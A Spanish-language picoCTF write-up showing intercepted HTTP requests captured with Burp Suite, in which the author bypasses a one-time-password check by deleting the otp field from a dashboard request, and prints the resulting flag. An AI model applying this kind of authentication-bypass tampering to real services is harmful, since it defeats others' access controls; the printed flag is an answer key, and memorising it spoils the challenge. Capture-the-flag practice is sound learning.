
## Descripción

*Additional details will be available after launching your challenge instance.*

*Try [here](http://titan.picoctf.net:57714/) to find the flag*

## Pistas

*Try using burpsuite to intercept request to capture the flag.
Try mangling the request, maybe their server-side code doesn't handle malformed requests very well.*

## Solución

```

#Cuando nos da el form vacio
GET / HTTP/1.1
Host: titan.picoctf.net:57475
Accept-Language: es-419,es;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Cookie: session=eyJjc3JmX3Rva2VuIjoiYmVmYjI5Njk0OGQyYjBhNTdlNWM0Mjc2ZDZiNTNlMGU3NzI4ZGQwMCJ9.Z-61HA.0JCNRw7bBD7ytpLtKvw1MYUAKaM
Connection: keep-alive



#Cuando llenamos el formulario
POST / HTTP/1.1
Host: titan.picoctf.net:57475
Content-Length: 190
Cache-Control: max-age=0
Accept-Language: es-419,es;q=0.9
Origin: http://titan.picoctf.net:57475
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://titan.picoctf.net:57475/
Accept-Encoding: gzip, deflate, br
Cookie: session=eyJjc3JmX3Rva2VuIjoiYmVmYjI5Njk0OGQyYjBhNTdlNWM0Mjc2ZDZiNTNlMGU3NzI4ZGQwMCJ9.Z-61HA.0JCNRw7bBD7ytpLtKvw1MYUAKaM
Connection: keep-alive

csrf_token=ImJlZmIyOTY5NDhkMmIwYTU3ZTVjNDI3NmQ2YjUzZTBlNzcyOGRkMDAi.Z-61HA.xdZ5fGYE_5HU7ck3OTEhH_QkKcs&full_name=ccce&username=eee&phone_number=asds&city=wewww&password=qwqqe&submit=Register

#Llenamos el campo
POST /dashboard HTTP/1.1
Host: titan.picoctf.net:57475
Content-Length: 8
Cache-Control: max-age=0
Accept-Language: es-419,es;q=0.9
Origin: http://titan.picoctf.net:57475
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://titan.picoctf.net:57475/dashboard
Accept-Encoding: gzip, deflate, br
Cookie: session=.eJwtjUsOAiEQRO_C2gU03_EyZIAmGmdgwifGGO9uT3RX9ZJX9WbxPl7syqSU7MJib9mP-sBCKGAOsJhFuQSBr9qijgqsSSZoiRytBZcS5-TluW2-rDuSJoQgUsdBWXNluaN6rL0_a0vEAOAEt1rQl7kHbL_78392bP8ZkMA-X0NwLWY.Z-61fg.dCFB4H2TgbpvlzNOlBz-iBBAByE
Connection: keep-alive

otp=qwww

	#Eliminamos  otp=qwww y recargamos la página y nos muestra la bandera.
HTTP/1.1 200 OK
Server: Werkzeug/3.0.1 Python/3.8.10
Date: Thu, 03 Apr 2025 16:22:23 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 104
Vary: Cookie
Connection: close

Welcome, 232 you sucessfully bypassed the OTP request. 
Your Flag: picoCTF{#0TP_Bypvss_SuCc3$S_3e3ddc76}
	
#DASHBOARD
Welcome, jjjjj you sucessfully bypassed the OTP request. Your Flag: picoCTF{#0TP_Bypvss_SuCc3$S_3e3ddc76}
```
picoCTF{#0TP_Bypvss_SuCc3$S_3e3ddc76}

## Notas Adicionales 

*Interceptamos el url con burpsuite*
## Referencias 


http://titan.picoctf.net:57714/
http://titan.picoctf.net:56403/dashboard
